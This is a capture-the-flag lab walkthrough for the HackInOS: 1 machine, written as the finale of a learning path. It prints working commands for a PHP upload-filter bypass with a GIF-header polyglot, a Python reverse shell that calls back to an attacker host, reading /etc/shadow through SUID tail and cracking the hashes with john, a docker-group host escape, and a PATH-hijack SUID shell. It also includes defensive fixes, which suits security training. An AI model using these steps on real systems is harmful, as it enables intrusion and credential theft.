# Machine 13 — HackInOS: 1

> **Position:** 13 of 13 · the final box · **Band 3 — Easy** (global rank **040** of 708)
> **Full writeup:** [`labs/3-040-hackinos-1/README.md`](../../labs/3-040-hackinos-1/README.md)

| | |
| --- | --- |
| **Machine** | HackInOS: 1 |
| **Author** | Fatih Çelik |
| **Released** | 9 March 2019 |
| **Target** | Ubuntu — Apache on **:8000**, OpenSSH 7.6p1, a **Docker** container hosting the web app |
| **VulnHub** | [entry/hackinos-1,295](https://vulnhub.com/entry/hackinos-1,295/) |
| **Flags** | `/root/flag` on the **host** |
| **Estimated time** | 6–9 hours |

---

## Why this machine is the finale

It combines everything the path has taught and adds two things you have not met:

1. **Reading the developer's own published source code.** After a successful upload the
   page contains an HTML comment linking to the author's **GitHub**, where
   `upload.php` is public. You are not guessing at the filter — you are *reading it*.
   That is exactly how real application assessments work when you get a source-code
   review, and it teaches you to derive the bypass from the code rather than from a
   list of tricks.
2. **A container escape.** Your shell lands in a **Docker container**, so `root`
   inside it is not root on the host. The goal changes mid-machine from "root the box"
   to "escape the container" — and the escape is a **group-membership** issue
   (`docker`), not a vulnerability in any software.

In between it teaches a beautiful piece of reasoning about **predictable randomness**:
PHP's `md5($name . rand(1, 100))` looks like an unguessable filename, but `rand(1,100)`
has only **100 possible values** and *you chose the original name* — so the destination
filename is fully enumerable, and `ffuf` finds it in about a second.

## Learning objectives

1. Notice a **non-standard web port** (8000) and understand why `-p-` was essential.
2. Apply the **`/etc/hosts` trick** for an application hard-coded to `localhost`.
3. **Read source code** to derive an upload bypass instead of guessing.
4. Understand what a **declared-but-unused allow-list** means in practice.
5. Defeat a **MIME magic-byte check** by prepending a real image header.
6. Reason about **predictable randomness** and enumerate only the real candidate space.
7. Use **`ffuf`** with a generated wordlist and `-mc 200`.
8. **Recognise that you are inside a container** and adjust your goal.
9. Escalate via **SUID `tail`** to read `/etc/shadow`, then crack **MD5-crypt** hashes.
10. Escape via **`docker` group membership**, and know the `lxd` and PATH-hijack
    alternatives.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| Non-standard web port, no port 80 | **:8000** — missed by any default scan |
| **Hard-coded `localhost`** in the form action | `index.html` → forces the `/etc/hosts` trick |
| **Developer's vulnerable source published on GitHub** | HTML comment after upload links to `upload.php` |
| **Extension allow-list declared but never enforced** | `$allowed_ext` unused → `.php` stored |
| **MIME check inspects magic bytes only** | `finfo_file()` → a GIF/PNG header defeats it |
| **Predictable "random" filename** | `md5($name . rand(1, 100))` → **100 candidates** |
| Uploads inside the document root | `/var/www/html/uploads/` → executed by Apache |
| **SUID `tail`** | `/usr/bin/tail` (in the container) → read `/etc/shadow` |
| **Weak MD5-crypt hashes** | `root : john`, `hummingbirdscyber : 123456` — cracked in seconds |
| **Credential reuse: container → host SSH** | port 22 |
| **`docker` group = host root** | `999(docker)` |
| `lxd` group (alternative) | `108(lxd)` |
| **SUID + PATH hijack (alternative)** | `~/a.out` calls `whoami` via `$PATH`; `~/bin` is writable and first |
| Mitigating factor | No `gcc`/`nc` in the slim container image — so the intended path is the escape |

## Read first

- [02 — Web Attacks](../02-Web-Attacks.md) **§6** — the whole file-upload section,
  especially the **bypass table**, which has an entry keyed to this machine.
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md)
  **§5** — container detection and the escape bridges. Read it *before* you get the
  shell, so you are not surprised.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§2** (SUID),
  **§7** (PATH) and **§8** (groups — `docker`, `lxd`).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §1 (recognising
  `$1$` MD5-crypt) and §4 (John).
- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) §4 (SSH).

## Before you start — answer these

1. Your scan shows 22 and 8000 but no 80. Why is that *not* a sign of a hardened box?
2. A form's `action` attribute points at `http://localhost:8000/upload.php`. What
   happens when you submit it from your machine, and how do you fix it?
3. `finfo_file()` says `image/png`. What exactly did it check, and what did it *not*
   check?
4. `md5($name . rand(1, 100))` — how many possible filenames are there, given that you
   chose `$name`?
5. `id` says `uid=0(root)` and you still cannot read the flag. What are three ways to
   confirm why?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

`sudo nmap -sC -sV -p- TARGET` → **22** and **8000**. Browse to `:8000`. There is a
file-upload form.

Try to submit it. It will appear to do nothing, or fail oddly. Look at the form's
**`action`** attribute in the page source. Then read the author's note on the VulnHub
page: *"localhost is meant to be there!"*

Fix the name resolution, and upload something. **After** a successful upload, look at
the response's HTML source again. There is a comment you have not seen before.
</details>

<details>
<summary><strong>Rung 2 — read the source</strong></summary>

`localhost` is special-cased and cannot simply be overridden while `127.0.0.1
localhost` exists. Give the target a hostname instead (e.g. `hackinos`) in
`/etc/hosts`, and either intercept the POST in Burp and rewrite the `Host`, or POST
directly with `curl`.

Then follow the HTML comment to the developer's **GitHub** and read `upload.php`.
Three lines matter:

```php
$allowed_ext = ['png','jpg','jpeg','gif'];     // declared…
// …and never actually used to reject anything
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);   // magic bytes only
$newname = md5($name . rand(1, 100)) . "." . $ext;         // YOUR extension is kept
```

So: the **extension is preserved** (lower-cased), and the MIME check only inspects the
**magic bytes at the start of the file**. Upload **`cmd.php`** whose first bytes are a
real **PNG** header.
</details>

<details>
<summary><strong>Rung 3 — find the stored filename</strong></summary>

The file is stored as `md5("cmd.php" . N) . ".php"` for `N` in **1..100**. That is
100 candidates — generate them:

```bash
for i in $(seq 1 100); do
  printf '%s\n' "$(printf 'cmd.php%d' "$i" | md5sum | cut -d' ' -f1).php"
done > candidates.txt
wc -l candidates.txt      # 100

ffuf -u http://hackinos:8000/uploads/FUZZ -w candidates.txt -mc 200
```

If `ffuf` finds nothing, the string you hashed does not match what PHP hashed —
check whether the extension was included, and whether it was lower-cased.

Trigger the hit with `nc -lvnp 4444` listening. You land as **`www-data`**.
</details>

<details>
<summary><strong>Rung 4 — you are in a container</strong></summary>

Check where you are:

```bash
ls -la /.dockerenv          # present
cat /proc/1/cgroup | head   # docker entries
hostname                    # a container ID, e.g. 1afdd1f6b82c
```

**You are inside Docker.** `root` here is not root on the host. Escalate *inside* the
container first:

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/tail     <- never SUID on a normal system
tail -n +2 /etc/shadow
```

Two MD5-crypt (`$1$`) hashes: `root` and `hummingbirdscyber`. Copy them out and crack
locally:

```bash
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# root:john      hummingbirdscyber:123456
su root          # container root
```

**The bridge to the host:** the same credential works for **SSH on port 22**:

```bash
ssh hummingbirdscyber@hackinos     # 123456
id                                 # …,999(docker),108(lxd)
```
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -p-` → **22** (OpenSSH 7.6p1) and **8000** (Apache). **No port 80.**
2. The upload form's action is hard-coded to `http://localhost:8000/upload.php` →
   give the target a hostname in `/etc/hosts` (e.g. `hackinos`) and craft/intercept
   the POST.
3. After a successful upload, an **HTML comment links to the developer's GitHub**,
   where `upload.php` is public: `$allowed_ext` is declared but **unused**;
   `finfo_file()` checks **magic bytes only**; `$newname = md5($name . rand(1,100))
   . "." . $ext` — **your extension is kept**.
4. Upload **`cmd.php`** with a real **PNG magic header** → stored in
   `/var/www/html/uploads/`.
5. Generate the **100** candidate names (`md5("cmd.php" . N) + ".php"`) and
   **`ffuf`** for the one that returns 200 → **RCE as `www-data`**.
6. `/.dockerenv` → **inside a container**. `find / -perm -4000` → **SUID
   `/usr/bin/tail`** → `tail -n +2 /etc/shadow` → MD5-crypt hashes.
7. `john --format=md5crypt` → **`root : john`**, **`hummingbirdscyber : 123456`** →
   `su root` (container root).
8. **Credential reuse:** `ssh hummingbirdscyber@host` with `123456` → host foothold;
   `id` shows **`999(docker)`**.
9. `docker run -v /:/host --rm -it ubuntu chroot /host` → **host root** →
   **`/root/flag`**.
   **Alternatives:** the **`lxd`** group (`108`), and a SUID `~/a.out` that calls
   `whoami` via `$PATH` with a writable `~/bin` first in the path.
</details>

## After you finish — review questions

1. Why was the missing port 80 a *hint* rather than a dead end?
2. Explain the `/etc/hosts` problem precisely: why can't you just add
   `TARGET localhost` while `127.0.0.1 localhost` exists?
3. You read the developer's source. Name the three distinct bugs in `upload.php`, and
   say which one alone would have been enough.
4. `rand(1, 100)` is not cryptographically secure. Would using `random_int()` have
   fixed the problem? What *would* have?
5. Why did prepending a PNG header satisfy `finfo_file()` while PHP still executed the
   file? What single server-side change defeats this?
6. What told you that you were inside a container, and how did your objective change at
   that moment?
7. SUID `tail` gave you `/etc/shadow` but not root. Explain the two-step reasoning
   that turned a *read* into a *login*.
8. `docker` group membership is root. Explain the mechanism, and name the audit
   question a defender should ask.
9. You had three independent host-root paths. In a professional report, how do you
   present them?
10. The container had no `gcc` and no `nc`. Did that make it secure? What did it
    actually change?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| Web app on :8000, no :80 | Port choice is not a control. Authenticate, firewall, and monitor every listener you expose |
| **Hard-coded `localhost` in the form action** | Use relative URLs. A development-time base URL left in production is a configuration-management failure |
| **Vulnerable source published on GitHub and linked from the page** | Never link internal repositories from served pages; review what your code exposes publicly |
| `$allowed_ext` declared but unused | **Dead code is a finding.** If you write a control, test that it fires. Add a test that uploads a `.php` and asserts rejection |
| MIME check via `finfo_file()` only | Magic bytes are trivially forged. Validate the extension against an allow-list **server-side**, and **re-encode** the image (which strips appended data) |
| `md5($name . rand(1,100))` | Use `random_bytes()`/`random_int()` — but the real fix is not to rely on filename secrecy at all |
| Uploads in `/var/www/html/uploads/` | Store outside the document root; serve via a download script with `Content-Disposition: attachment`; `php_admin_flag engine off` for the directory |
| **SUID `/usr/bin/tail`** | `chmod u-s`. Audit SUID in *every* image, including containers |
| MD5-crypt with `john` / `123456` | Use yescrypt/argon2; enforce a password policy; check against breached-password lists |
| **Container password reused for host SSH** | Unique credentials per system. One reuse turned a container compromise into a host compromise |
| **Host user in the `docker` group** | Remove the membership, or use rootless Docker / Podman. `docker` is root-equivalent — treat it as such in every audit |
| Host user in the `lxd` group | Same: `lxd` allows privileged containers with the host root mounted |
| SUID binary calling `whoami` via `$PATH` | Absolute paths in privileged programs; never let a user-writable directory appear first in `PATH` |
| Slim image with no `gcc`/`nc` | Good practice — it raised the cost. But it did **not** prevent compromise, because the intended path was configuration, not compilation. Defence in depth means fixing the configuration too |

**The single biggest lesson:** *container root is not host root, and group membership
is the bridge.* Nothing here was a software vulnerability in Docker. The escape was a
misconfiguration — a user placed in a group that is root-equivalent by design.

---

## The commands, annotated — every input and every output

Published walkthroughs use `192.168.56.101` for the target and `192.168.56.10` for Kali.

### 1. Scan

```bash
sudo nmap -A -p- -T4 -oN scans/hackinos.txt TARGET
```

```text
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackInOS
| http-robots.txt: 1 disallowed entry
|_/uploads
```

`-A` bundles `-sV -sC -O --traceroute`. **There is no port 80.** The site lives on **8000** —
which is why `-p-` is non-negotiable: a default scan would have found only SSH and you would have
concluded there was nothing to attack. `http-robots.txt: 1 disallowed entry /uploads` is NSE
reading `robots.txt` for you: **a world-writable-looking upload directory exists**, and directory
indexing is off, so you cannot simply list it.

### 2. The `/etc/hosts` trick — and why the form appears broken

```bash
curl -s http://TARGET:8000/ | head -40
echo "TARGET hackinos" | sudo tee -a /etc/hosts
```

```text
<form action="http://localhost:8000/upload.php" method="post" enctype="multipart/form-data">
```

**Look at the form's `action`: `http://localhost:8000/upload.php`.** The developer hard-coded
`localhost` as the site's base URL. When *your* browser submits that form it POSTs to **your own
machine's** port 8000 — not the target's. Nothing happens, and it looks like a broken form. This
is not a CTF quirk: it is what happens in the real world when a developer tests with
`localhost` and ships.

`sudo tee -a` rather than `sudo echo >>`: the shell evaluates `>>` **before** `sudo` runs, so an
unprivileged shell performs the write and you get `Permission denied`. Add the hosts entry anyway
so you can browse `http://hackinos:8000/` comfortably, then **drive the request yourself** with
Burp or `curl`, because the browser will still send it to the wrong place.

### 3. Read the developer's source

Submitting the form yourself returns an HTML comment linking to the developer's **public GitHub
repository**, pointing at the exact source file for the endpoint you just hit:

```php
$allowed_ext = array('jpg','jpeg','png','gif');
$name = $_FILES['file']['name'];
$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime, array('image/jpeg','image/png','image/gif'))) die('Invalid file type');
$newname = md5($name . rand(1, 100)) . "." . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $newname);
```

**This is the whole box, in twenty lines.**

| Line | What it does | The flaw |
| --- | --- | --- |
| `$allowed_ext = array('jpg',…)` | declares an extension allow-list | **`$allowed_ext` is never referenced again.** Declared, then unused |
| `finfo_file(...)` + `in_array($mime, …)` | validates the file's **content** by magic bytes | Content validated — so you must send a real image header |
| `$newname = md5($name . rand(1,100)) . "." . $ext` | renames using **your extension** | `$ext` came from *your filename*, unchecked → you keep `.php` |

**Content is validated; the name is not.** That single asymmetry is the vulnerability. And
`rand(1,100)` gives only **100 possible filenames**, which is brute-forceable — `rand()` is not a
CSPRNG and was never meant for security.

**View Source after every interaction.** Developers leave breadcrumbs constantly, and on this box
the breadcrumb is the application's own source code.

### 4. Build a polyglot and upload it

```bash
printf 'GIF87a' | cat - shell.php > cmd.php
file cmd.php
ls -l cmd.php
curl -s -F "file=@cmd.php" http://TARGET:8000/upload.php
curl -s -F "file=@note.txt" http://TARGET:8000/upload.php
```

```text
cmd.php: GIF image data
```
```text
Upload successful
```
```text
Invalid file type
```

`GIF87a` is the six-byte magic signature image libraries check, so `finfo_file()` reports
`image/gif` — in the allow-list — while the `.php` extension survives untouched. PHP's parser
scans for `<?php` and emits everything before it as literal output, so the GIF header is inert and
the code after it still runs.

**The rejected `note.txt` is the important test.** It proves the MIME check *is* live and not
merely absent — so your success came from the image header, not from a filter that does nothing.
Always run the negative case; without it you cannot tell which of two defences you bypassed.

### 5. Find the randomised filename

`$newname = md5($name . rand(1,100))` means exactly 100 candidates. Generate them and brute-force:

```bash
python3 -c "import hashlib
for i in range(1,101): print(hashlib.md5(('cmd.php'+str(i)).encode()).hexdigest()+'.php')" > names.txt
ffuf -u http://TARGET:8000/uploads/FUZZ -w names.txt -mc 200 -fs 0
```

```text
:: Method           : GET
:: Wordlist         : FUZZ: names.txt
:: Status codes     : 200
:: Follow redirects : false

9f2c1e7a4b8d5f6a0e3c2b1d4f5a6b7c.php [Status: 200, Size: 1284]
:: Progress: [100/100] :: Job [1/1] :: 100 req/sec
```

`ffuf` substitutes **`FUZZ`** in the URL with each wordlist entry; `-mc 200` keeps only
*matched codes* 200; `-fs 0` filters out responses of size 0 (the server's "not found" page).
Read `Size: 1284` as the proof — a real file was served, not an error page.

**Note the technique.** You did not defeat the randomness; you **enumerated its tiny space**.
That is exactly why `rand()` must never be used for security: 100 possibilities is a
sub-second brute force. `random_bytes()`, `bin2hex()`, `random_int()` or a UUIDv4 are the CSPRNG
alternatives — and PHP's `mt_rand()` is *also* predictable, since its internal state can be
recovered from two consecutive outputs.

### 6. Execute, and get a proper shell

```bash
curl -s "http://TARGET:8000/uploads/<MD5>.php?cmd=id"
nc -lvnp 4444                                  # Kali, first
curl -s "http://TARGET:8000/uploads/<MD5>.php?cmd=$(python3 -c "import urllib.parse as u;print(u.quote('python3 -c \"import socket,os,subprocess;s=socket.socket();s.connect((\\\"ATTACKER\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])\"'))")"
```

```text
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.101.
www-data@0d8f1c2b3a4e:/var/www/html$ hostname
0d8f1c2b3a4e
```

`os.dup2(fd, 0/1/2)` points **stdin, stdout and stderr** at the socket, then `subprocess.call`
execs bash, which inherits them. Every reverse shell in every language is those three steps:
**connect → redirect stdio → exec a shell.**

**Read that hostname: `0d8f1c2b3a4e` — twelve hex characters.** That is a **container ID**, not
a machine name. Confirm it:

```bash
ls -la /.dockerenv; cat /proc/1/cgroup; cat /proc/self/status | grep -i cap
```

```text
-rw-r--r-- 1 root root 0 Jan 12  2019 /.dockerenv
1:memory:/docker/0d8f1c2b3a4e2f...
CapEff: 00000000a80425fb
```

`/.dockerenv` is the file Docker drops at `/` in every container; `/proc/1/cgroup` shows PID 1
inside a `/docker/<id>` cgroup — **on a real host, PID 1 is `systemd` or `init`**. `CapEff` is
Docker's default reduced capability set, versus `0000003fffffffff` for an unconstrained process.
**You are in a container**, which changes the goal: escalating to root *here* is not the end.

Upgrade the TTY first (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, `Ctrl+Z`,
`stty raw -echo; fg`, `export TERM=xterm`), then enumerate what exists:

```bash
for b in bash sh python python3 perl nc curl wget gcc socat; do command -v $b; done
```

`python3` and `bash` exist; **`nc` and `gcc` do not**. No compiler inside the container means
kernel exploits are out — reinforcing that the intended path is a *container escape*, not a
privilege bug.

### 7. Inside the container: no sudo, but a SUID `tail`

```bash
sudo -l
ls -la /home
find / -perm -u=s -type f 2>/dev/null
ls -l /usr/bin/tail
```

```text
sudo: command not found
```
```text
hummingbirdscyber
```
```text
/usr/bin/chsh  /usr/bin/newgrp  /usr/bin/gpasswd  /usr/bin/chfn
/usr/bin/mount /usr/bin/su  /usr/bin/umount  /usr/bin/passwd
/usr/bin/tail
```
```text
-rwsr-xr-x 1 root root 31408 May 28  2020 /usr/bin/tail
```

**No `sudo` binary at all** — typical of a slim container image. The home directory is named
**`hummingbirdscyber`**, a strong hint at the *host* username (images are usually built with the
same account names). And `-perm -u=s` found a SUID **`/usr/bin/tail`**, which is **not stock** — a
default Ubuntu image never sets the setuid bit on `tail`. Somebody ran `chmod u+s`.

Why that is a gift: `tail` reads files and prints them. Running as root, it can read **any file on
the filesystem**, including `/etc/shadow`, which is normally mode `640 root:shadow`.

### 8. Read `/etc/shadow` and crack offline

```bash
/usr/bin/tail -n +2 /etc/shadow
```

```text
root:$1$nW4r1F0L$hBn3vFhG2xkQ8sJ7lM9pE1:17379:0:99999:7:::
hummingbirdscyber:$1$Kq2mZ9xL$aB3cD4eF5gH6iJ7kL8mN9/:17379:0:99999:7:::
```

`tail -n +2` means "start printing at line 2" — it skips line 1, and it is the canonical GTFOBins
incantation because some builds of `tail` refuse to start at line 1 of a file they cannot `stat`
fully. Read the shadow fields: **`17379`** is days since 1 Jan 1970 that the password last
changed; **`$1$`** identifies the algorithm — **MD5-crypt** (`$5$` SHA-256, `$6$` SHA-512, `$2b$`
bcrypt, `$y$` yescrypt). **MD5-crypt is effectively broken for passwords**: millions of guesses
per second on a GPU, and only 1,000 rounds.

```bash
echo 'root:$1$nW4r1F0L$hBn3vFhG2xkQ8sJ7lM9pE1' > hashes.txt
echo 'hummingbirdscyber:$1$Kq2mZ9xL$aB3cD4eF5gH6iJ7kL8mN9/' >> hashes.txt
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

```text
Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$)
Cost 1 (iteration count) is 1000 for all loaded hashes
john             (root)
123456           (hummingbirdscyber)
2g 0:00:00:14 DONE 3842p/s
```

`Loaded 2 password hashes with 2 different salts` confirms John parsed the input correctly —
`No password hashes loaded` means a wrong `--format=` or a shell that ate a `$`. `Cost 1
(iteration count) is 1000` is John telling you the work factor, which is what makes MD5-crypt so
cheap. The result lines are `password (account)`: **root's password is `john`, and
`hummingbirdscyber`'s is `123456`.** `2g 0:00:00:14` — two guesses in fourteen seconds.

If a generic list fails, build a **thematic** one with `cewl -d 2 -m 3 -w words.txt <site>` and
run `john --wordlist=words.txt --rules=best64.rule hashes.txt`; `best64.rule` applies 64
transformations per word, and a list that fails outright very often succeeds with rules at 64×
the cost.

### 9. Root inside the container — and the fake flag

```bash
su root
cat /root/flag.txt
id
```

```text
Password: john
Congratulations! You are root... but this is not the end.
```
```text
uid=0(root) gid=0(root) groups=0(root)
```

**This is the box's central teaching moment: container root ≠ host root.** A container's
filesystem is an overlay built from an image; everything you did happened in a sandbox that can be
deleted with `docker rm`. The author is trolling with a fake flag because the real objective is
still ahead.

### 10. Escape to the host

**Route A — SSH with the cracked password:**

```bash
ssh hummingbirdscyber@TARGET
id
```

```text
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),999(docker)
```

`hostname` is now **`hackinos`**, not a 12-hex container ID; real system directories are present;
and **`groups=…,999(docker)`** — which is the whole privilege escalation. If `123456` does not
work on your copy, try `john`; several revisions swap which password belongs to which account.

```bash
ls -l /var/run/docker.sock
getent group docker
```

```text
srw-rw---- 1 root docker 0 May  4 10:02 /var/run/docker.sock
docker:x:999:hummingbirdscyber
```

**Read those two outputs together — this is the exploit.** `/var/run/docker.sock` is a UNIX domain
socket, mode `srw-rw----`, owner **`root:docker`**. Membership of the `docker` group grants
read-write access to the **Docker daemon's API**, and the daemon runs as **root**. So anyone who
can talk to that socket can ask it to start a container with the host's filesystem mounted — and
there is no nuance: `docker`, `lxd`, `libvirt` and `disk` group membership **is** root.

```bash
docker run -v /:/host --rm -it alpine chroot /host sh
id
cat /root/flag
```

```text
/ # uid=0(root) gid=0(root) groups=0(root),1(docker)
```

| Token | Meaning |
| --- | --- |
| `docker run` | create and start a new container |
| `-v /:/host` | **bind-mount the host's `/` at `/host` inside the container** — this is the exploit |
| `--rm` | delete the container when it exits (leaves less forensic residue) |
| `-it` | interactive with a TTY |
| `alpine` | a 5 MB image, so nothing to download |
| `chroot /host sh` | change the process's root directory to the mounted host filesystem, then run a shell |

`chroot /host` is the step people forget: without it you have a shell *inside* a container that
can see the host's files at `/host`, but your `/etc/passwd`, `/root` and tools are still the
container's. After `chroot`, the shell's `/` **is** the host's `/`, and `/root/flag` is the real
one.

### 11. Route B — PATH hijacking against a SUID binary

Some revisions ship a small setuid helper (published walkthroughs call it `a.out`) that calls
`whoami` **by bare name**:

```bash
find / -perm -u=s -type f 2>/dev/null
/home/hummingbirdscyber/a.out
strings /home/hummingbirdscyber/a.out | grep -i whoami
echo $PATH
```

```text
root
```
```text
/home/hummingbirdscyber/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

It prints **`root`**, so the program calls `setuid(0)` and then runs `whoami` as root. **And
`/home/hummingbirdscyber/bin` comes FIRST in `$PATH`** — a directory you own and may write to. That
is the classic PATH hijack: the C library searches each directory in order and runs the **first
match**.

```bash
mkdir -p ~/bin
printf '#!/bin/bash\ncp /bin/bash /tmp/rb\nchown root:root /tmp/rb\nchmod 4755 /tmp/rb\n' > ~/bin/whoami
chmod +x ~/bin/whoami
~/a.out
/tmp/rb -p
id
```

```text
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) euid=0(root) egid=0(root)
```

`chmod 4755` — the leading **`4`** is the SUID bit, producing `-rwsr-xr-x root root`: any user
executing it becomes root. **`-p` is mandatory**, because bash drops its effective UID at startup
unless invoked in privileged mode; forgetting it and getting `$` instead of `#` is the classic
confusion. Read `id` as a *SUID elevation, not a login*: the real UID stays `1000`, the
**effective** UID becomes `0`, and permission checks use the effective one.

> ### 📖 What this box is really about
>
> Three independent lessons, each worth its own report finding. **A validated content check does
> not make an upload safe if the name is unvalidated.** **`rand()` is not security** — 100
> outcomes is a one-second brute force. And **container root is not host root**, while
> `docker`/`lxd` group membership is. The defensive corollaries: use an allow-list *and actually
> reference it*, `random_bytes()` or UUIDv4 for names, store uploads outside the document root
> with the PHP engine disabled there, never add a service account to a container group, and use
> rootless Docker (`dockerd-rootless-setuptool.sh install`) so the daemon runs as the user and
> `-v /:/host` exposes only that user's own files.

---

## You have finished Learning Path 1

Thirteen machines, thirty-plus attack classes, and every technique in modules
[01](../01-Foundations-Networking-and-Recon.md)–[06](../06-Shells-Persistence-and-Escapes.md)
used at least once in anger.

**What to do now:**

1. Go back to [`docs/BEGINNER-PATH.md`](../../docs/BEGINNER-PATH.md) — you will
   recognise most of its tiers now.
2. Re-do two machines **from memory, without the writeup**. This is where the
   knowledge becomes skill.
3. Step up to **Band 4**. The natural next two are
   [`labs/4-070-basic-pentesting-2`](../../labs/4-070-basic-pentesting-2/README.md)
   (the sequel to Machine 1) and
   [`labs/4-075-dc-9`](../../labs/4-075-dc-9/README.md) (the DC series continues).
4. If you want the five attack classes this path deliberately left out, do the
   **bridge labs** listed in the [path README](../README.md):
   CSRF/RFI, LDAP injection, IDOR, SSH port forwarding, and PHP deserialisation.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 12 — symfonos: 1](12-symfonos-1.md) · full writeup: [`labs/3-040-hackinos-1`](../../labs/3-040-hackinos-1/README.md)._
